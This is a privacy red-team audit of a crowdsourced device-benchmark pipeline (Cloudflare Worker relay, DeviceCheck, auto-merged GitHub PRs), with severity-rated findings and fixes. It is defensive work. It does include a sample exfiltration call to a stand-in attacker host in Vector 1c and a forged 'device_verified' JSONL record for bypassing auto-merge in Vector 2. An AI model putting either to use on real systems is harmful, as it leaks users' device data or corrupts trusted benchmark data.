# Provenance Architecture v2 — Second-Round Privacy Red-Team

> **Role:** Privacy auditor attacking the v2 *fixes themselves*.
> **Target:** `2026-07-02_provenance-architecture-v2.md`
> **Scope:** Does the Cloudflare Worker relay + DeviceCheck + JSONL + PR-based intake actually fix the 10 CRITICAL privacy findings, or does it relocate them?
> **Verdict:** v2 makes genuine structural improvements (coarsened data, no username binding, DeviceCheck verification). But it introduces **one CRITICAL new attack** (relay bypass — the entire trust model is defeated by a 30-second direct-PR attack), and **moves rather than fixes** four other problems (relay trust surface, residual fingerprinting, git erasure, aggregate k=1 leak). One vector (DeviceCheck replay) is **made worse by the "stores nothing" design constraint**.

---

## Summary Scorecard

| # | Attack Vector | Severity | v2 Verdict |
|---|---|---|---|
| 1 | Relay as new privacy surface | **HIGH** | Moves problem: PII concentrated in one unmonitored serverless function |
| 2 | Relay bypass via direct PR | **CRITICAL** | **Not fixed.** Trust model has no cryptographic binding. 30-second attack. |
| 3 | Residual fingerprinting in small-N | **HIGH** | Not fixed: coarsening insufficient at k<5, which is the norm at launch |
| 4 | Consent withdrawal + git immutability | **CRITICAL** | **Made worse.** "Erasure is trivial: force-push" is false and dangerous advice |
| 5 | DeviceCheck limitations (replay, opt-out, MDM) | **HIGH** | "Stores nothing" makes replay prevention impossible; opt-out users excluded |
| 6 | Aggregate k=1 data leak | **HIGH** | Not addressed at all; aggregate IS individual data for niche model+device combos |

---

## Attack Vector 1: The Relay as New Privacy Surface

### Severity: HIGH (concentrated PII in an unmonitored, unaudited component)

**v2's claim:** "The repo never sees raw device data." This is true. But the relay sees *more* sensitive data than the v1 design ever put in the repo — and there is no corresponding protection for it.

**1a. The relay receives full PII-grade data, then the design declares victory.**

The relay's input (line 261-263, line 280-286) includes:
- `device.model: "iPhone17,1"` (hardware identifier)
- `device.chip`, `device.ram_gb`, `device.os_version` (the exact fingerprint the round-1 review called out as GDPR personal data under Breyer C-582/14)
- `DeviceCheck JWT` (a per-device cryptographic token)
- `model_hash` (reveals installed-model inventory)
- Full UTC timestamp
- The request's source IP (the Worker receives it by definition — line 58 acknowledges this)

v2 fixes the *publication* problem but creates a *processing* problem. Under GDPR, the relay is a **data processor** receiving personal data. The data subject's rights (Art. 15 access, Art. 17 erasure, Art. 21 objection) now attach to the relay's processing, even though the *output* is anonymized. The design's legal analysis (line 64-68) only considers whether the *published* data is personal — it ignores that the relay itself is processing personal data and must have a lawful basis, retention policy, and DPA.

**1b. "Stores nothing" is unverified and unverifiable by the data subject.**

Line 68: "the relay retains nothing past forwarding." This is a claim, not a guarantee. There is no mechanism for a user to verify it. Concretely:

- **CF Workers Logs / Tail.** Cloudflare Workers Observability (the default logging layer) captures request metadata by default: URL, method, headers, status, timing. The request *body* is not included in default logs. But if Logpush or Workers Analytics Engine is enabled, or if the Worker itself calls `console.log(request.body)` for debugging, the full payload — including the PII-grade device fingerprint — is logged and retained in CF's log pipeline. The design says nothing about log configuration. Default retention for CF Workers Logs is **3 days**, but Logpush to external destinations (S3, R2, Datadog) persists indefinitely.
- **The Worker code is not in the repo.** The design provides TypeScript *snippets* (lines 97-110) but no actual Worker source, no `wrangler.toml`, no deployment configuration. The round-2 buildability review confirms: "CF Worker code: ❌ No, only TypeScript snippets in the design doc." A user sending data to the relay has no way to know what code is actually running. Unlike the repo (which is public and auditable), the Worker is a black box.
- **Reproducible deployment is impossible.** Even if the Worker source were published, CF Workers don't have a mechanism for a client to verify that the running code matches the published source. The app POSTs to a URL; it cannot attestation-verify the Worker. Contrast with Apple's App Attest, which gives the *server* proof about the *client* — there is no equivalent for the client to verify the server.

**1c. A malicious or compromised Worker update silently exfiltrates data.**

Worker deployments are controlled by whoever holds the CF API token and `wrangler` credentials. The design names no governance structure. The round-2 buildability review flagged that the Apple Developer account has a single-owner bus-factor problem; the same applies to the CF account.

**Concrete scenario:** The CF account is compromised (credential leak, phishing, or the maintainer's GitHub account — which holds the CF integration — is breached). The attacker deploys a modified Worker that:
1. Performs all the legitimate coarsening/verification steps (so the GitHub Action and published data look normal)
2. Additionally logs the raw payload to an external endpoint (a one-line `fetch('https://attacker.example/collect', {body: rawPayload})`)

The device fingerprints, model hashes, DeviceCheck tokens, and timestamps of every submission are now in the attacker's hands. There is no detection mechanism — the Worker is designed to be stateless and unlogged. The attack is invisible until the data appears in a breach.

**1d. Does v2 fix it or move the problem?**

**Moves it.** v1 put device fingerprints in a public repo (bad — permanent, visible). v2 puts them in a serverless function that receives them transiently (better — not permanently public). But the relay is now a **single point of concentration**: all device fingerprints flow through one endpoint with no independent monitoring, no multi-party control, and no client-verifiable guarantee of correct behavior. The attack surface is smaller but the blast radius of compromise is total.

---

## Attack Vector 2: Relay Bypass via Direct PR

### Severity: CRITICAL — the entire DeviceCheck trust model is defeated by opening a PR manually

**This is the most severe finding in the v2 design.** The trust chain has a missing link that makes all upstream verification irrelevant.

**2a. The repo is public, the format is documented, and the Action cannot tell relay-originated from attacker-originated PRs.**

Trace the trust chain:
1. The device generates a DeviceCheck JWT and sends it to the relay.
2. The relay verifies the JWT with Apple, then sets `device_verified: true` in the sanitized payload.
3. The relay forwards to the GitHub Bot, which opens a PR with the JSONL line.
4. The GitHub Action validates the PR and checks auto-merge criteria.

**The break is between steps 3 and 4.** The Action's auto-merge criteria (line 188-197) checks:
```
3. device_verified: true (DeviceCheck confirmed by relay)
```

But `device_verified` is a **boolean field in a JSON object** (schema line 452-455: `"type": "boolean"`). The Action validates the JSON against the schema. A boolean is valid if it's `true` or `false`. The schema has no mechanism to bind the `true` value to a relay attestation.

**The attack (30 seconds, no special access):**
1. Clone the repo (it's public).
2. Add a line to `benchmarks.jsonl`:
```jsonl
{"id":"bm-fake-001","model_id":"official-qwen3-4b","metric":"decode_throughput","value":145.4,"unit":"tokens_per_second","device_class":"A18 Pro","os_major":"27","compute_unit":"GPU","precision":"int4","extraction_method":"app_benchmark_protocol","confidence":"high","provenance":{"protocol_version":"2.0","warmup_runs":3,"measured_runs":10,"statistic":"median","stddev":2.1,"thermal_state":"nominal","battery_state":"charging"},"device_verified":true,"model_verified":true,"observed_date":"2026-07-02","source":"crowdsourced","submission_channel":"ditto-ios-0.1.0"}
```
3. Open a PR.
4. The Action runs. Schema validation: passes (the line is valid JSON matching the schema). `model_id` exists: passes. `device_verified: true`: passes — **it's just a field in the diff, and the Action has no way to know who set it.** MAD outlier check: passes if the value is plausible. `thermal_state: nominal`, `battery_state: charging`: passes. Rate limit (criterion 8): "no existing benchmark from same device_class + model_id + runtime_config in last 7 days" — the Action can't distinguish device classes anyway (there's no device identity in the coarsened data), so this check is based on the published `device_class` string, which the attacker controls.
5. **Auto-merge fires.** The fabricated benchmark is now in `benchmarks.jsonl` on `main`.

DeviceCheck, the relay, the Apple API verification — **none of it matters.** An attacker bypasses the entire chain by writing `device_verified: true` in a JSONL file and opening a PR. The trust anchor is a self-attested field in the data being submitted.

**2b. "The bot authored the PR" is the implicit assumption, but it's not enforced.**

The design's architecture diagram (line 303-308) shows the GitHub Bot opening the PR. The unstated assumption is that only the bot opens benchmark PRs. But:
- The design's auto-merge criteria (line 188-197) **does not include "PR authored by `coreai-benchmark-bot`"** as a criterion. It checks data fields, not provenance.
- Even if the Action *did* check `github.event.pull_request.user.login == "coreai-benchmark-bot"`:
  - GitHub usernames are not cryptographic identities. Anyone can create an account.
  - The bot is described as a "bot account" (line 59) — if it's a regular GitHub user (not a GitHub App), its username is just a string.
  - If it's a GitHub App, the check should be on the App ID / installation, not username — but the design doesn't specify.
- The bot's PAT/token (discussed in round-2 buildability review, Vector 2) authenticates the bot to GitHub, but it does NOT authenticate the *data* the bot writes. The bot is a courier, not a signer.

**2c. The fix: cryptographic attestation binding.**

The relay must sign the sanitized payload, and the Action must verify the signature before auto-merging. Concretely:

1. The relay holds an asymmetric key pair (e.g., Ed25519). The private key never leaves the Worker.
2. After coarsening and verifying DeviceCheck, the relay signs the canonical JSON of the sanitized payload: `signature = sign(privateKey, canonicalJSON(payload))`.
3. The signature is included in the JSONL line as a field: `"relay_signature": "ed25519:base64..."`.
4. The Action verifies: `verify(publicKey, canonicalJSON(payloadWithoutSignature), signature)`. The public key is embedded in the repo (it's not secret).
5. The schema is updated to make `relay_signature` required for `extraction_method: app_benchmark_protocol` entries.

Now an attacker who opens a direct PR cannot forge the signature without the relay's private key. The trust anchor is cryptographic, not a self-attested boolean.

**Without this fix, the relay's DeviceCheck verification is security theater.** The expensive crypto chain (DeviceCheck JWT → Apple API → relay verification) is bypassed by a free GitHub PR.

**2d. Does v2 fix it or move the problem?**

**Does not fix it.** This is a new hole introduced by the architecture. v1's Issue-based intake at least had a human curator reading every submission. v2's auto-merge removes the human and relies on data-field checks that are trivially forgeable.

---

## Attack Vector 3: Residual Fingerprinting in Small-N Scenarios

### Severity: HIGH (k-anonymity fails at launch and for niche combinations)

**v2's claim (line 65):** "The published data contains only hardware class + date + performance numbers — these are not personal data under GDPR Art. 4 because they cannot single out an individual."

**This claim is false at small N, and small N is the default state for a new catalog.**

**3a. Quasi-identifier analysis of the published fields.**

The published record contains these quasi-identifiers:

| Field | Cardinality (estimate) | Contribution to uniqueness |
|---|---|---|
| `device_class` ("A18 Pro") | ~10 (current Apple chip families) | Low alone, but constrains population |
| `os_major` ("27") | ~3 (26, 27, 27-beta) | Low |
| `compute_unit` ("GPU") | 4 (GPU, ANE, CPU, mixed) | Low |
| `precision` ("int4") | ~5 (int4, int8, fp16, etc.) | Medium for specific models |
| `extraction_method` | 7 values | Low for app submissions |
| `submission_channel` ("ditto-ios-0.1.0") | ~3-5 app versions | Low, but version pins to a time window |
| `observed_date` | 365/year | **Medium-high** when combined with device_class |
| `value` (metric) | Continuous | **High** — each device produces slightly different numbers |
| `provenance.stddev` | Continuous | **High** — device-specific variance fingerprint |
| `provenance.thermal_state` | 2 (nominal, fair) | Low |
| `provenance.battery_state` | 1 (always "charging" — enforced) | None |

**k-anonymity calculation for a realistic launch scenario:**

Model: `official-qwen3-4b` on `A18 Pro` with `GPU` + `int4`.
- At launch: maybe 3-5 users have benchmarked this specific combination.
- The quasi-identifier tuple is: (`A18 Pro`, `27`, `GPU`, `int4`, `app_benchmark_protocol`, `2026-07-02`, value=145.4, stddev=2.1).
- **k = 1-5 depending on the day and model.** On most days for most models, k=1 (only one submission exists for that combination).

GDPR Recital 26: "Personal data which have undergone pseudonymisation which could be attributed to a natural person by the use of additional information should be considered to be information on an identifiable natural person." The coarsened fields are pseudonymized, not anonymized — and pseudonymization that leaves k < 5 is re-identifiable with auxiliary information.

**3b. Concrete re-identification scenario with auxiliary information.**

An attacker (or the curator, or GitHub, or anyone who can see the PR list) knows:
- "Kevin has an iPhone 17 Pro (A18 Pro) running iOS 27."
- "Kevin benchmarked Qwen3-4B on July 2nd."

They look at `benchmarks.jsonl` and find exactly one entry matching (`A18 Pro`, `27`, `qwen3-4b`, `2026-07-02`). **Re-identified.** The metric value, stddev, and thermal state are now linked to Kevin — and this is permanent in git history.

The 1-24h random delay (line 52, line 288-289) doesn't help here because `observed_date` is still date-granular. An attacker who knows the *date* Kevin benchmarked (from social media, Discord, a forum post) can still match. The delay only breaks sub-day temporal correlation, not day-level.

(The round-2 buildability review additionally found that the 1-24h delay is architecturally impossible in CF Workers without stateful infrastructure — so even this weak protection may not ship.)

**3c. Cross-submission tracking via value fingerprints.**

Even without auxiliary information, if a user submits benchmarks for *multiple models*, their submissions form a cluster. Each A18 Pro device has slightly different performance characteristics (silicon lottery, thermal history, background processes). If user X submits benchmarks for models A, B, and C:
- The `value` fields are correlated (same device → consistent relative performance across models).
- The `stddev` fields are correlated (same device → consistent variance characteristics).
- The `observed_date` fields cluster temporally (same user benchmarks in the same session/week).

An attacker with access to the full JSONL can cluster submissions by value-distribution similarity and reconstruct per-device submission sets. With 10 models benchmarked by the same device, the cluster is statistically unique even without any other quasi-identifier.

**3d. Does v2 fix it or move the problem?**

**Partially moves it.** v1 published raw device model + full timestamp — trivially re-identifiable (k=1 always). v2 coarsens to device_class + date — better, but k is still 1-5 for most model+device combinations at launch and for niche models indefinitely. The coarsening raises the bar but doesn't reach k-anonymity at k≥5 for the long tail. The `value` and `stddev` fields, being continuous and device-specific, are residual fingerprints that no coarsening of the categorical fields can address.

---

## Attack Vector 4: Consent Withdrawal + Git Immutability

### Severity: CRITICAL — the erasure claim is false, and "force-push" advice is actively harmful

**v2's claim (line 67):** "Erasure is trivial: delete the JSONL line and force-push (or accept that the aggregate data point is anonymous enough that erasure isn't required)."

**Both halves of this sentence are wrong.**

**4a. "Erasure is trivial" — it is not. Deleting a JSONL line and force-pushing is socially, technically, and legally broken.**

The design recommends force-pushing to rewrite git history on a **public repository with contributors**. The consequences:

1. **Breaks every clone and fork.** Force-push rewrites commit hashes. Every contributor's local clone now has divergent history. `git pull` produces merge conflicts or phantom commits. Contributors must `git reset --hard origin/main` and lose local work. This is acceptable for a solo project; it is hostile to a community project.

2. **Git history rewrite doesn't reach the data.** Even after `git filter-repo` rewrites the main branch:
   - **GitHub's PR history persists.** The bot opened a PR for every benchmark. The PR body says "benchmark: {model_id} on {device_class}" and the diff shows the exact JSONL line. Closed PRs are visible indefinitely. Force-pushing main does not delete PRs.
   - **GitHub Actions logs persist.** The validation Action ran on the PR and printed the JSONL line in its log output. Actions logs are retained for 90 days (free) or 400 days (paid), and can be exported.
   - **The Events API caches PR data** for up to 90 days, accessible via the public API.
   - **Forks and mirrors** retain the original history. Anyone who forked the repo before the rewrite has the data. GitHub cannot force-push forks.
   - **archive.org / package mirrors / search engine caches** may have snapshots.
   - **The `dist/` artifacts** (`benchmarks.json`, `benchmarks-aggregate.json`, `benchmarks.yaml`) are in git. Even if you delete the JSONL line and regenerate, the old commits retain the generated files with the data. Force-pushing rewrites these too — but see above for all the places it doesn't reach.

3. **The "alternative" is a legal dodge.** "(or accept that the aggregate data point is anonymous enough that erasure isn't required)" — this is not a mechanism, it's a unilateral declaration that the data is anonymous. Under GDPR Art. 17, the data subject can dispute this. Per Vector 3, the data may not be anonymous in small-N scenarios. If the data subject's erasure request is valid and the controller says "it's anonymous, we don't need to erase," the controller is exposed to Art. 82 damages claims.

**4b. Realistic erasure without force-push — there is none for git-stored data.**

The fundamental problem is unchanged from v1: **git is an immutable, replicated, public data store.** v2 changed the data format (YAML→JSONL) and the intake channel (Issue→PR) but did not change the storage medium. The right to erasure (GDPR Art. 17, LGPD Art. 18(VI), CCPA §1798.105) cannot be satisfied for data committed to a public git repository. The options are:

| Approach | Works? | Tradeoff |
|---|---|---|
| Force-push history rewrite | ❌ No | Doesn't reach PRs, Actions logs, forks, caches. Breaks contributors. |
| Accept "data is anonymous" | ❌ Conditional | Only valid if k-anonymity ≥ threshold (per Vector 3, not met for small-N). Disputable by data subject. |
| Don't put personal data in git | ✅ Yes | Requires storing raw data in a mutable store and publishing only true aggregates. This is a fundamentally different architecture. |
| Honest disclosure: "erasure not guaranteed" | ⚠️ Partial | Must be disclosed before consent (GDPR Art. 13(2)(b)). May invalidate consent if the data isn't truly anonymized. |

**4c. The consent withdrawal mechanism is incomplete.**

Line 76: "Withdrawal: toggle off in Settings at any time. No data queued after that."

This stops *future* submissions. It does not address *past* submissions. The GDPR requires withdrawal to be "as easy as giving consent" (Art. 7(3)) — but more importantly, withdrawal of consent means the lawful basis for *all* processing of that data lapses, including the already-published data. If consent is withdrawn and the data can't be erased (because it's in git), the controller is processing unlawfully.

The design needs an explicit, honest statement: "Due to the nature of public git repositories, we cannot guarantee complete erasure of historical benchmark data. By consenting, you acknowledge that submitted data may persist in public git history, forks, and caches even after withdrawal." This must be presented *before* consent (Art. 13), not discovered after.

**4d. Does v2 fix it or move the problem?**

**Does not fix it. Makes it worse by offering false confidence.** v1 at least didn't claim erasure was possible. v2 explicitly claims "erasure is trivial" and recommends force-push — which is both incorrect and, if followed, destructive to the project. The honest answer is: **erasure is not possible for data in public git.** The mitigation is to ensure the published data is truly anonymous (k≥5) so that erasure isn't required — but v2 doesn't enforce k≥5 (see Vectors 3 and 6).

---

## Attack Vector 5: DeviceCheck Limitations

### Severity: HIGH (the "stores nothing" constraint conflicts with replay prevention; opt-out users are excluded)

**5a. The "stores nothing" promise makes replay prevention impossible.**

DeviceCheck tokens are not single-use at Apple's API level. The `validate_token` endpoint returns `{"status": "valid"}` for the same token on repeated calls — Apple does not invalidate the token after validation. The `transaction_id` field in the request body is for *developer-side* deduplication tracking; Apple records it but does not enforce uniqueness.

This means: **a valid DeviceCheck token can be replayed.** If an attacker captures a token (via MitM on the app→relay connection, by compromising the relay, or by extracting it from the app's memory on a jailbroken device), they can submit it to the relay multiple times, each time generating a new "verified" benchmark.

The standard defense is server-side nonce tracking: the relay records each `transaction_id` and rejects duplicates. But the design says the relay "stores nothing" (line 68, line 273). A truly stateless relay cannot implement replay prevention. The nonce in the design's code (line 105, commented out) is never verified against a used-nonce set.

The design's claim (line 117): "The nonce prevents replay attacks (same token can't be used twice)" is **false as specified.** The nonce prevents replay only if the relay tracks used nonces — which requires state, which the design explicitly prohibits.

**Fix:** The relay needs a stateful nonce store. CF Durable Objects or KV with a short TTL (e.g., 7 days — DeviceCheck tokens are valid for a limited window) can implement this without long-term data retention. But this contradicts "stores nothing" and adds infrastructure complexity (see round-2 buildability review, Vector 1).

**5b. DeviceCheck opt-out: privacy-conscious users are penalized.**

Users can disable DeviceCheck at Settings → Privacy & Security → Analytics & Improvements (or it may be disabled by MDM). When disabled, `DCDevice.current.isSupported` returns `false` and `generateToken()` throws.

The design's only fallback is the CLI path: `extraction_method: community_submission`, `confidence: low`, excluded from aggregates (line 119-120). A privacy-conscious iOS app user who disabled DeviceCheck is treated identically to a CLI user with no Apple hardware at all. Their genuine benchmark data — which may be perfectly accurate — is structurally excluded from the high-confidence dataset.

This is an ironic privacy penalty: the users most likely to have disabled DeviceCheck (privacy-conscious ones) are the ones whose data the system refuses to trust. It also biases the dataset toward users who haven't touched their privacy settings — a selection bias that may correlate with technical sophistication.

**5c. MDM-managed devices may have DeviceCheck disabled.**

Enterprise MDM profiles can restrict or disable DeviceCheck. The design doesn't address this. Enterprise users on managed devices — who may be the most relevant audience for a benchmarking catalog used in deployment decisions — cannot contribute high-confidence data. The dataset is biased toward consumer/unmanaged devices.

**5d. DeviceCheck does not verify the benchmark methodology.**

DeviceCheck proves: genuine Apple hardware, genuine app, not a simulator. It does NOT prove:
- The benchmark was actually run (the app could generate a fabricated metric value and still produce a valid DeviceCheck token).
- The environmental preconditions were met (thermal_state, battery_state are self-reported by the app, not verified by DeviceCheck).
- The model hash corresponds to the model being benchmarked (the relay checks the hash, but the app controls which hash it computes and sends).

A malicious or modified app build can produce valid DeviceCheck tokens with fabricated benchmark values. DeviceCheck raises the cost of gaming (you need a real device) but does not prevent it. Combined with Vector 2 (relay bypass), an attacker doesn't even need a real device — they can forge `device_verified: true` directly.

**5e. Does v2 fix it or move the problem?**

**Partially fixes, partially moves.** v1's DeviceCheck was a boolean checkbox (CRITICAL). v2's actual JWT verification is a genuine improvement — it proves hardware authenticity. But the "stores nothing" constraint creates a new replay vulnerability, and the opt-out/MDM edge cases are unaddressed. The methodology verification gap (self-reported environmental data) is unchanged from v1.

---

## Attack Vector 6: The Aggregate Data Leak (k=1 Publication)

### Severity: HIGH — the default consumption path can publish individual data

**v2's claim (line 353-355):** `benchmarks-aggregate.json` publishes per model+device+config: `{ median, p5, p25, p75, p95, sample_count, last_updated }`.

The design says (line 359): "CLI/MCP/API consume the aggregate by default (fast, compact)."

**6a. sample_count=1 means the aggregate IS the individual data point.**

When there is one submission for a model+device+config combination (common for new or niche models):
- `median` = the single value
- `p5` = `p25` = `p75` = `p95` = the single value
- `sample_count` = 1

The "aggregate" publishes the exact individual measurement. There is no k-anonymity threshold for aggregate publication. The design's outlier detection requires N≥5 for the MAD check (line 193, line 512), but there is no corresponding minimum for aggregate publication.

**6b. sample_count=2 leaks both individual values.**

With two submissions:
- `median` = average of the two values → leaks their sum (and with one known, the other is recoverable)
- `p5` ≈ min, `p95` ≈ max → leaks both individual values directly

**6c. This is the default, easy-to-consume artifact.**

The aggregate JSON is the primary consumption path for the MCP server, CLI, and API. It is served via raw GitHub URLs (per the AGENTS.md: `https://raw.githubusercontent.com/kevinqz/coreai-catalog/main/dist/`). It is the most accessible, most cached, most replicated artifact. If it contains individual data points, those are more widely distributed than the raw JSONL.

**6d. The aggregate compounds with Vector 3.**

Vector 3 shows that the raw JSONL entries are re-identifiable at small N. The aggregate makes this worse: even if a future version somehow protects the JSONL (e.g., by removing it from the public repo and publishing only aggregates), the aggregate itself leaks individual data at k<5. The "aggregate is safe" assumption fails exactly where the raw data is also unsafe — small-N model+device combinations.

**6e. Fix: minimum-k threshold for aggregate publication.**

The aggregate generator (`generate.py`) should suppress publication for any model+device+config combination with `sample_count < 5` (or a configurable threshold). Suppressed combinations can be listed as `"model_id": "...", "device_class": "...", "sample_count": 3, "suppressed": true` — this tells users data exists without revealing individual values.

Alternatively, use differential privacy noise injection for small-N aggregates. But for a benchmark catalog where accuracy matters, suppression is simpler and more honest.

**6f. Does v2 fix it or move the problem?**

**Not addressed at all.** The aggregate publication is presented as a performance optimization (line 359: "fast, compact") with no privacy analysis. It introduces a new publication surface that can leak individual data for any combination with fewer than 5 samples — which, for a catalog with 66+ models and 10+ device classes, is the majority of combinations.

---

## Cross-Cutting Analysis: Where v2 Moves vs. Fixes

| v1 Finding | v2 Fix | Genuinely Fixed? |
|---|---|---|
| C1: Device fingerprint re-identifies | Relay coarsens to device_class | **Partially.** Categorical fields are coarsened; continuous fields (value, stddev) remain fingerprints. k<5 at launch. |
| C2: GitHub Issues bind username to data | Bot-authored PRs | **Yes, structurally.** But PR metadata (author, timestamp) still exists in the API. The bot's activity pattern is itself a metadata surface. |
| C3: HMAC reversible in OSS | DeviceCheck JWT | **Yes.** DeviceCheck is Apple-managed crypto, not a shared secret. (But see Vector 2 — the JWT is bypassable via direct PR.) |
| C4: Sybil + <5 = auto-accept | DeviceCheck + bootstrap quarantine | **No, bypassed.** Vector 2 shows the bootstrap quarantine is defeated by direct PR. DeviceCheck is irrelevant if the attacker skips the relay. |
| C5: Self-reported, zero verification | DeviceCheck JWT verified by relay | **Partially.** Hardware is verified; methodology and values remain self-reported. And bypassable (Vector 2). |
| C10: "No PII = GDPR exempt" false | Relay strips all PII | **Moves the problem.** PII is stripped from the *output* but concentrated in the *relay's input*. The relay is now a data processor under GDPR. |
| H1: Opt-in not granular | 3 separate toggles | **Fixed.** This is a genuine improvement. |
| H2: model_hash leaks inventory | Hash verified by relay, never published | **Fixed for publication.** But the relay still receives the hash (Vector 1c). |
| H3: Timestamps leak timezone | Date only, +random delay | **Partially.** Date-level granularity still enables re-identification with auxiliary info (Vector 3b). Delay is architecturally infeasible in CF Workers (round-2 buildability review). |

---

## Recommendations (Priority-Ordered)

### P0 — Must fix before any deployment

1. **Cryptographic relay attestation (Vector 2).** The relay must sign each sanitized payload with an asymmetric key. The GitHub Action must verify the signature before auto-merge. Without this, the entire DeviceCheck trust model is bypassable by a 30-second direct PR. This is a one-day implementation (Ed25519 sign in Worker, verify in Action, embed public key in repo).

2. **Drop the "erasure is trivial: force-push" claim (Vector 4).** Replace with honest disclosure: historical benchmark data cannot be fully erased from public git. Present this before consent. This is a documentation fix, not a code fix.

3. **Minimum-k threshold for aggregate publication (Vector 6).** Suppress aggregate entries with `sample_count < 5`. This is a 10-line change in `generate.py`.

### P1 — Should fix before scaling beyond the curator's own submissions

4. **Stateful nonce tracking in the relay (Vector 5a).** Use CF KV with a 7-day TTL to track used DeviceCheck nonces. Accept that "stores nothing" must become "stores nonce hashes for 7 days."

5. **Relay governance (Vector 1).** Publish the Worker source in the repo. Document the CF account ownership and rotation procedure. Add a health-check Action that pings the Worker daily.

6. **k-anonymity audit on the published JSONL (Vector 3).** Before publishing, compute k for each (device_class, os_major, model_id, observed_date) tuple. Suppress tuples with k < 5, or accept the risk with documented justification.

### P2 — Should address for long-term health

7. **DeviceCheck opt-out fallback (Vector 5b).** Allow DeviceCheck-disabled users to submit with `extraction_method: app_benchmark_protocol` but `device_verified: false`, with `confidence: medium` (not low) if the environmental preconditions are met. This avoids the privacy penalty for privacy-conscious users.

8. **Document the relay as a GDPR data processor (Vector 1a).** The relay processes personal data. It needs a lawful basis (consent — which the app collects), a retention policy (zero retention, verified by log configuration), and this must be disclosed in the privacy policy.

---

*Second-round privacy red-team. 6 attack vectors, 2 CRITICAL, 4 HIGH. The relay bypass (Vector 2) is the single most urgent fix — it invalidates the DeviceCheck investment entirely.*
